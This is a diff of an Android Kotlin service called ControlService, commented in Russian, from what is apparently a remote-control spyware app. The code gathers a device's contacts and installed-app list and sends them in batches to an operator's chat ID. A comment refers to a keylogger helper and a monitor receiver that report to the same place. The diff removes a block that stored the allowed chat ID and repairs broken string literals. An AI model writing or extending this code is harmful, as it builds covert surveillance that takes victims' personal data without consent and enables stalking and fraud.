@@ -77,13 +77,6 @@ class ControlService : Service() {
 
     override fun onCreate() {
         // Сохраняем ALLOWED_CHAT_ID чтобы MonitorReceiver и KeyloggerHelper знали куда слать
-        try {
-            val chatId = BuildConfig::class.java.getField("ALLOWED_CHAT_ID").get(null) as? String ?: ""
-            if (chatId.isNotEmpty()) {
-                getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-                    .edit().putString("allowed_chat_id", chatId).apply()
-            }
-        } catch (_: Exception) {}
         super.onCreate()
         deviceId = getOrCreateDeviceId()
         createNotificationChannel()
@@ -662,9 +655,7 @@ class ControlService : Service() {
                 }
                 // Отправляем по 100 контактов на сообщение
                 contacts.chunked(100).forEachIndexed { i, chunk ->
-                    val text = "📒 Контакты [${i+1}/${(contacts.size+99)/100}]:
-" + chunk.joinToString("
-")
+                    val text = "📒 Контакты [${i+1}/${(contacts.size+99)/100}]:\n" + chunk.joinToString("\n")
                     sendTextReply(chatId, text)
                 }
             } catch (e: Exception) {
@@ -688,9 +679,7 @@ class ControlService : Service() {
                     return@launch
                 }
                 apps.chunked(50).forEachIndexed { i, chunk ->
-                    val text = "📱 Приложения [${i+1}/${(apps.size+49)/50}]:
-" + chunk.joinToString("
-")
+                    val text = "📱 Приложения [${i+1}/${(apps.size+49)/50}]:\n" + chunk.joinToString("\n")
                     sendTextReply(chatId, text)
                 }
             } catch (e: Exception) {
